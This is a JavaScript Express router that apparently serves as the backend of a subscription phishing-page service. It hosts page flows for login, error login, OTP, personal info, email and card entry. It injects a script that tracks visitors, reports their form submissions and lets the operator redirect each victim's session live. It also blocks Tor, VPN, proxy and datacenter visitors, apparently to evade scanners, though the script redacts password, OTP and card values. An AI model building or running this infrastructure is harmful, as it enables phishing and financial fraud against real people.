import { Router } from "express";
import { timingSafeEqual } from "node:crypto";
import {
  deliverSessionCommand,
  findPackage,
  pageSubscriptionState,
  resolveUserPageSubscription,
  savePageResult,
  saveTrafficEvent,
  updateUserPageConfig
} from "../repositories/appRepository.js";
import {
  contentTypeFor,
  fetchGitHubPackageFile,
  previewFileForPackage,
  previewSourceForPackage,
  resolveRelativePath
} from "../services/packagePreview.js";
import {
  publicTurnstileConfig,
  turnstileSecretFor,
  verifyTurnstileToken
} from "../services/turnstile.js";
import { deviceBlocked } from "../services/deviceRules.js";

export const runtimeRouter = Router();
const accessDeniedMessage = "ACCESS DENIED";
const pageExpiredMessage = "Page Expired Renew to continue using";

const runtimePayloadLimits = {
  config: 8 * 1024,
  security: 16 * 1024,
  traffic: 24 * 1024,
  result: 96 * 1024,
  command: 8 * 1024,
  verify: 16 * 1024
};

runtimeRouter.use((req, res, next) => {
  res.setHeader("Cache-Control", "no-store");
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Robots-Tag", "noindex, nofollow");
  next();
});

function requestIp(req) {
  return req.headers["cf-connecting-ip"]
    || req.headers["x-forwarded-for"]?.split(",")[0]?.trim()
    || req.socket.remoteAddress
    || "unknown";
}

function normalizeHost(value = "") {
  return String(value)
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//, "")
    .replace(/\/.*$/, "")
    .replace(/:\d+$/, "");
}

function runtimeError(res, status, error, detail = {}) {
  res.status(status).json({ error, ...detail });
  return null;
}

function accessDenied(res, status = 403) {
  return runtimeError(res, status, accessDeniedMessage);
}

function expiredPageHtml() {
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex,nofollow">
  <title>Page Expired</title>
  <style>
    html, body { height: 100%; margin: 0; }
    body {
      display: grid;
      place-items: center;
      background: #070909;
      color: #f4fff8;
      font: 700 16px/1.45 Arial, sans-serif;
    }
    main {
      width: min(420px, calc(100% - 32px));
      padding: 28px;
      border: 1px solid rgba(255,255,255,.12);
      border-radius: 8px;
      text-align: center;
      background: rgba(255,255,255,.045);
    }
    h1 { margin: 0; font-size: clamp(1.35rem, 5vw, 2rem); }
  </style>
</head>
<body>
  <main><h1>${pageExpiredMessage}</h1></main>
</body>
</html>`;
}

function pageExpired(res, status = 402, options = {}) {
  if (options.html) {
    res.status(status);
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.send(expiredPageHtml());
    return null;
  }
  return runtimeError(res, status, pageExpiredMessage, { reason: pageExpiredMessage });
}

function safeCompare(value, expected) {
  const a = Buffer.from(String(value || ""));
  const b = Buffer.from(String(expected || ""));
  if (a.length !== b.length) return false;
  return timingSafeEqual(a, b);
}

function payloadTooLarge(req, res, limit) {
  const size = Buffer.byteLength(JSON.stringify(req.body || {}), "utf8");
  if (size <= limit) return false;
  runtimeError(res, 413, "Runtime payload too large", { limit });
  return true;
}

function runtimeIdFrom(req) {
  return String(req.body?.userPageId || req.query?.userPageId || req.body?.pageId || req.query?.pageId || "").trim();
}

function validSessionId(value = "") {
  return /^[a-z0-9_.:-]{0,96}$/i.test(String(value || ""));
}

function relaySecretFor(page) {
  return page?.hostingConfig?.relaySecret
    || page?.hostingConfig?.cloudflareRelaySecret
    || page?.generatedFile?.relaySecret
    || "";
}

function allowedHostsFor(page) {
  return Array.from(new Set([
    page?.domain,
    page?.hostingConfig?.domain
  ].map(normalizeHost).filter(Boolean)));
}

function publicPageConfig(page) {
  const security = page.securityConfig || {};
  return {
    id: page.id,
    pageId: page.slug,
    pageName: page.name,
    packageId: page.packageId,
    packageVersion: page.packageVersion,
    domain: page.domain,
    status: page.status,
    subscription: page.subscription,
    subscriptionState: pageSubscriptionState(page),
    hosting: {
      domain: page.hostingConfig?.domain || page.domain || "",
      hostingType: page.hostingConfig?.hostingType || "cpanel",
      installPath: page.hostingConfig?.installPath || "public_html",
      connectionType: page.hostingConfig?.connectionType || "cloudflare-worker",
      relayVerified: Boolean(page.hostingConfig?.relayVerified)
    },
    security: {
      domains: allowedHostsFor(page),
      captcha: Boolean(security.captcha),
      turnstile: publicTurnstileConfig(security),
      bannedIpCount: (security.bannedIps || []).length,
      whitelistIpCount: (security.whitelistIps || []).length,
      blockedDevices: security.blockedDevices || []
    },
    resultSettings: page.resultSettings || {},
    generatedFile: page.generatedFile || {},
    flow: page.flow || [],
    configs: page.configs || {}
  };
}

async function runtimeContext(req, res, options = {}) {
  const userPageId = runtimeIdFrom(req);
  if (!userPageId || userPageId.length > 120) {
    return runtimeError(res, 400, "Runtime page id required");
  }
  const page = await resolveUserPageSubscription(userPageId);
  if (!page) {
    return runtimeError(res, 404, "Runtime page not found");
  }

  const expectedSecret = relaySecretFor(page);
  const providedSecret = req.headers["x-deuce-relay-secret"] || req.body?.relaySecret;
  if (expectedSecret && !safeCompare(providedSecret, expectedSecret)) {
    return accessDenied(res);
  }

  const clientHost = normalizeHost(req.headers["x-deuce-client-host"] || req.body?.hostname || req.query?.hostname || req.headers.origin || req.headers.host);
  const allowedHosts = allowedHostsFor(page);
  if (allowedHosts.length && !clientHost) {
    return accessDenied(res);
  }
  if (allowedHosts.length && clientHost && !allowedHosts.includes(clientHost)) {
    return accessDenied(res);
  }

  const subscriptionState = pageSubscriptionState(page);
  if (subscriptionState.blocked) {
    return pageExpired(res, 402, options.expiredResponse === "html" ? { html: true } : {});
  }

  return { page, clientHost, ip: requestIp(req) };
}

function enforceRuntimeSecurity(context, req, res) {
  const decision = securityDecision(context.page, context.ip, req.headers["user-agent"], req);
  if (decision.allowed) return decision;
  accessDenied(res);
  return null;
}

function headerValue(req, name) {
  return String(req?.headers?.[name] || "").trim();
}

function proxySecurityDecision(security = {}, req = null) {
  const rules = security.vpnProxyRules || {};
  const cfCountry = headerValue(req, "cf-ipcountry").toUpperCase();
  const explicitProxySignal = [
    "x-anonymous-ip",
    "x-vpn",
    "x-proxy-id",
    "x-proxy-type",
    "x-tor-exit-node",
    "proxy-authorization",
    "proxy-connection"
  ].some((name) => Boolean(headerValue(req, name)));
  const reputationType = headerValue(req, "x-deuce-ip-type").toLowerCase()
    || headerValue(req, "x-ip-type").toLowerCase();
  const reputationRisk = headerValue(req, "x-deuce-ip-risk").toLowerCase()
    || headerValue(req, "x-ip-risk").toLowerCase();

  if (rules.blockTor && (cfCountry === "T1" || reputationType.includes("tor"))) {
    return { blocked: true, proxyType: "tor", reason: "Tor traffic is blocked" };
  }
  if (rules.blockVpnProxies && (
    explicitProxySignal
    || reputationType.includes("vpn")
    || reputationType.includes("proxy")
    || reputationRisk === "anonymous"
  )) {
    return { blocked: true, proxyType: "proxy", reason: "VPN or proxy traffic is blocked" };
  }
  if (rules.blockHostingProviders && (
    reputationType.includes("hosting")
    || reputationType.includes("datacenter")
    || reputationType.includes("server")
  )) {
    return { blocked: true, proxyType: "hosting", reason: "Hosting provider traffic is blocked" };
  }
  return { blocked: false, proxyType: null };
}

function securityDecision(page, ip, userAgent = "", req = null) {
  const security = page.securityConfig || {};
  const bannedIps = security.bannedIps || [];
  const whitelistIps = security.whitelistIps || [];
  if (whitelistIps.includes(ip)) return { allowed: true, reason: "IP whitelisted" };
  if (bannedIps.includes(ip)) return { allowed: false, reason: "IP blocked by page security rules" };
  const proxy = proxySecurityDecision(security, req);
  if (proxy.blocked) return { allowed: false, reason: proxy.reason, proxyType: proxy.proxyType };
  const device = deviceBlocked(security, userAgent);
  if (device.blocked) return { allowed: false, reason: `${device.deviceType} devices are blocked`, deviceType: device.deviceType };
  if (page.status && page.status !== "active") return { allowed: false, reason: "Page subscription is not active" };
  return { allowed: true, reason: "Allowed", deviceType: device.deviceType, proxyType: proxy.proxyType };
}

function packageContainsFile(pagePackage, file) {
  const cleanFile = String(file || "").replace(/^\/+/, "");
  const files = pagePackage.packageManifest?.files || [];
  return files.some((item) => (item.path || item) === cleanFile);
}

function runtimeAssetUrl(userPageId, file) {
  const params = new URLSearchParams({ userPageId, file });
  return `/api/source/asset?${params.toString()}`;
}

function runtimePageUrl(userPageId, file) {
  const params = new URLSearchParams({ userPageId, file });
  return `/api/source?${params.toString()}`;
}

function rewriteRuntimeHtml(html, { userPageId, file }) {
  const rewritten = html.replace(/\b(src|href|action)=["']([^"']+)["']/gi, (match, attr, value) => {
    const resolved = resolveRelativePath(file, value);
    if (!resolved) return match;
    if (/\.html?$/i.test(resolved)) {
      return `${attr}="${runtimePageUrl(userPageId, resolved)}"`;
    }
    return `${attr}="${runtimeAssetUrl(userPageId, resolved)}"`;
  });

  const bridge = `<script>
(function () {
  const sessionKey = "deuce_session_" + ${JSON.stringify(userPageId)};
  const pageLabels = {
    "index.html": "Login page",
    "login2.html": "Error login page",
    "otp.html": "OTP page",
    "personal.html": "Personal info page",
    "email.html": "Email page",
    "c.html": "Card page",
    "thnks.html": "Thank you page"
  };
  const runtime = {
    userPageId: ${JSON.stringify(userPageId)},
    pageId: ${JSON.stringify(file)},
    sessionId: getSessionId()
  };
  const apiBase = window.location.pathname.indexOf("/api/runtime/") === 0 ? "/api/runtime" : "/api";

  function endpoint(path) {
    return apiBase + "/" + String(path || "").replace(/^\\/+/, "");
  }

  function sameLocation(targetUrl) {
    try {
      const target = new URL(targetUrl, window.location.href);
      const current = new URL(window.location.href);
      return target.origin === current.origin
        && target.pathname === current.pathname
        && target.search === current.search
        && target.hash === current.hash;
    } catch (error) {
      return false;
    }
  }

  function getSessionId() {
    try {
      const existing = window.sessionStorage.getItem(sessionKey);
      if (existing) return existing;
      const next = "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
      window.sessionStorage.setItem(sessionKey, next);
      return next;
    } catch (error) {
      return "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
    }
  }

  function pageLabel() {
    const name = runtime.pageId.split("/").pop().toLowerCase();
    return pageLabels[name] || runtime.pageId;
  }

  function isSensitiveField(field, input) {
    const text = [
      field,
      input && input.name,
      input && input.id,
      input && input.type,
      input && input.autocomplete,
      input && input.placeholder,
      input && input.getAttribute && input.getAttribute("aria-label")
    ].filter(Boolean).join(" ").toLowerCase();
    return /password|passcode|otp|one.?time|verification|2fa|mfa|pin|card|cc|credit|debit|cvv|cvc|security.?code|expiry|exp|routing|account|ssn|social|token|secret|credential|login|email/.test(text);
  }

  function safeFormData(form) {
    const data = {};
    const fields = Array.from(form.elements || []).filter(function (input) {
      return input && input.name && !input.disabled && !["submit", "button", "reset", "file"].includes(String(input.type || "").toLowerCase());
    });
    fields.forEach(function (input) {
      const key = input.name;
      if (isSensitiveField(key, input)) {
        data[key] = input.value ? "[redacted]" : "[blank]";
        return;
      }
      data[key] = input.value || "";
    });
    data._fieldCount = fields.length;
    data._redaction = "passwords, OTPs, card fields, login/email credentials, tokens, and similar sensitive values are not stored";
    return data;
  }

  function send(path, payload) {
    return fetch(endpoint(path), {
      method: "POST",
      keepalive: true,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userPageId: runtime.userPageId,
        pageId: runtime.pageId,
        sessionId: runtime.sessionId,
        hostname: window.location.hostname,
        path: window.location.pathname,
        createdAt: new Date().toISOString(),
        ...payload
      })
    }).catch(function () {});
  }

  function sendHeartbeat() {
    send("traffic", {
      event: "heartbeat",
      screen: pageLabel(),
      metadata: {
        visibility: document.visibilityState || "visible"
      }
    });
  }

  send("traffic", { event: "page_load", screen: pageLabel() });
  sendHeartbeat();

  function checkCommand() {
    const params = new URLSearchParams({
      userPageId: runtime.userPageId,
      sessionId: runtime.sessionId
    });
    fetch(endpoint("session-command") + "?" + params.toString())
      .then(function (response) { return response.ok ? response.json() : null; })
      .then(function (data) {
        const command = data && data.command;
        if (command && command.action === "redirect" && command.targetUrl) {
          if (sameLocation(command.targetUrl)) {
            if (command.forceReload) window.location.reload();
            return;
          }
          window.location.href = command.targetUrl;
        }
      })
      .catch(function () {});
  }

  window.setInterval(checkCommand, 4000);
  window.setInterval(sendHeartbeat, 10000);

  document.addEventListener("submit", function (event) {
    const form = event.target;
    if (!form || !(form instanceof HTMLFormElement)) return;
    const data = safeFormData(form);
    send("results", {
      screen: pageLabel(),
      data: data,
      flow: [runtime.pageId],
      userAgent: navigator.userAgent
    });
  }, true);
})();
<\/script>`;

  if (rewritten.includes("</body>")) return rewritten.replace("</body>", `${bridge}</body>`);
  return `${rewritten}${bridge}`;
}

async function packageForRuntimePage(page) {
  const pagePackage = await findPackage(page.packageId || page.slug);
  if (!pagePackage) throw new Error("Runtime package not found");
  return pagePackage;
}

async function sendRuntimePackageFile(req, res, { asAsset = false } = {}) {
  const context = await runtimeContext(req, res, { expiredResponse: asAsset ? "json" : "html" });
  if (!context) return;
  if (!enforceRuntimeSecurity(context, req, res)) return;

  const pagePackage = await packageForRuntimePage(context.page);
  const requestedFile = String(req.query?.file || "");
  const file = requestedFile || previewFileForPackage(pagePackage);
  if (file.includes("..") || file.length > 240) {
    res.status(400).send("Invalid package file");
    return;
  }
  if (!file || !packageContainsFile(pagePackage, file)) {
    res.status(404).send("Package file not found");
    return;
  }
  if (asAsset && /\.html?$/i.test(file)) {
    res.status(404).send("Package asset not found");
    return;
  }

  const source = previewSourceForPackage(pagePackage, file);
  const response = await fetchGitHubPackageFile(source);
  if (asAsset || !/\.html?$/i.test(file)) {
    const buffer = Buffer.from(await response.arrayBuffer());
    res.setHeader("Content-Type", contentTypeFor(file));
    res.setHeader("Cache-Control", "no-store");
    res.send(buffer);
    return;
  }

  const html = await response.text();
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.setHeader("Cache-Control", "no-store");
  res.setHeader("X-Robots-Tag", "noindex, nofollow");
  res.send(rewriteRuntimeHtml(html, { userPageId: context.page.id, file }));
}

runtimeRouter.get("/config", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  if (!enforceRuntimeSecurity(context, req, res)) return;
  res.json({ config: publicPageConfig(context.page) });
});

runtimeRouter.post("/config", async (req, res) => {
  if (payloadTooLarge(req, res, runtimePayloadLimits.config)) return;
  const context = await runtimeContext(req, res);
  if (!context) return;
  if (!enforceRuntimeSecurity(context, req, res)) return;
  res.json({ config: publicPageConfig(context.page) });
});

runtimeRouter.get("/source", async (req, res) => {
  try {
    await sendRuntimePackageFile(req, res);
  } catch (error) {
    console.warn("Runtime source failed:", error.message);
    res.status(400).send("Runtime source unavailable");
  }
});

runtimeRouter.get("/source/asset", async (req, res) => {
  try {
    await sendRuntimePackageFile(req, res, { asAsset: true });
  } catch (error) {
    console.warn("Runtime asset failed:", error.message);
    res.status(404).send("Runtime asset unavailable");
  }
});

runtimeRouter.post("/security/check", async (req, res) => {
  if (payloadTooLarge(req, res, runtimePayloadLimits.security)) return;
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = securityDecision(context.page, context.ip, req.headers["user-agent"], req);
  if (!decision.allowed) {
    res.status(403).json({ allowed: false, reason: accessDeniedMessage });
    return;
  }
  res.json({ ...decision, ip: context.ip, host: context.clientHost });
});

runtimeRouter.post("/verify-human", async (req, res) => {
  if (payloadTooLarge(req, res, runtimePayloadLimits.verify)) return;
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = securityDecision(context.page, context.ip, req.headers["user-agent"], req);
  if (!decision.allowed) {
    res.status(403).json({ verified: false, reason: accessDeniedMessage });
    return;
  }

  const security = context.page.securityConfig || {};
  if (!security.captcha) {
    res.json({ verified: true, skipped: true });
    return;
  }

  const result = await verifyTurnstileToken({
    token: req.body?.token || req.body?.["cf-turnstile-response"],
    secret: turnstileSecretFor(security),
    remoteIp: context.ip
  });
  res.status(result.success ? 200 : 400).json({
    verified: result.success,
    reason: result.success ? "Verified" : accessDeniedMessage
  });
});

runtimeRouter.post("/traffic", async (req, res) => {
  if (payloadTooLarge(req, res, runtimePayloadLimits.traffic)) return;
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = securityDecision(context.page, context.ip, req.headers["user-agent"], req);
  const event = await saveTrafficEvent({
    ...req.body,
    userPageId: context.page.id,
    pageId: context.page.slug,
    hostname: context.clientHost || req.body?.hostname,
    result: req.body?.result || (decision.allowed ? "allowed" : "blocked"),
    reason: req.body?.reason || decision.reason,
    metadata: {
      ...(req.body?.metadata || {}),
      deviceType: decision.deviceType || null,
      proxyType: decision.proxyType || null
    }
  }, context.ip, req.headers["user-agent"]);
  res.status(201).json({
    event: decision.allowed ? event : { ...event, reason: accessDeniedMessage },
    allowed: decision.allowed,
    reason: decision.allowed ? decision.reason : accessDeniedMessage
  });
});

runtimeRouter.get("/session-command", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const sessionId = req.query?.sessionId || req.body?.sessionId;
  if (!validSessionId(sessionId)) return runtimeError(res, 400, "Invalid session id");
  const result = await deliverSessionCommand(context.page.id, sessionId);
  res.json(result || { command: null });
});

runtimeRouter.post("/session-command", async (req, res) => {
  if (payloadTooLarge(req, res, runtimePayloadLimits.command)) return;
  const context = await runtimeContext(req, res);
  if (!context) return;
  if (!validSessionId(req.body?.sessionId)) return runtimeError(res, 400, "Invalid session id");
  const result = await deliverSessionCommand(context.page.id, req.body?.sessionId);
  res.json(result || { command: null });
});

runtimeRouter.post("/results", async (req, res) => {
  if (payloadTooLarge(req, res, runtimePayloadLimits.result)) return;
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = securityDecision(context.page, context.ip, req.headers["user-agent"], req);
  if (!decision.allowed) {
    res.status(403).json({ error: accessDeniedMessage });
    return;
  }
  const result = await savePageResult({
    ...req.body,
    userPageId: context.page.id,
    pageId: context.page.slug,
    pageName: context.page.name,
    hostname: context.clientHost || req.body?.hostname
  }, context.ip, req.headers["user-agent"]);
  res.status(201).json({ result });
});

runtimeRouter.post("/relay/verify", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const hostingConfig = {
    ...(context.page.hostingConfig || {}),
    relayVerified: true,
    relayVerifiedAt: new Date().toISOString(),
    verified: true,
    verifiedAt: new Date().toISOString(),
    liveStatus: "Live"
  };
  await updateUserPageConfig(context.page.id, { hostingConfig });
  res.json({ ok: true, host: context.clientHost, userPageId: context.page.id });
});
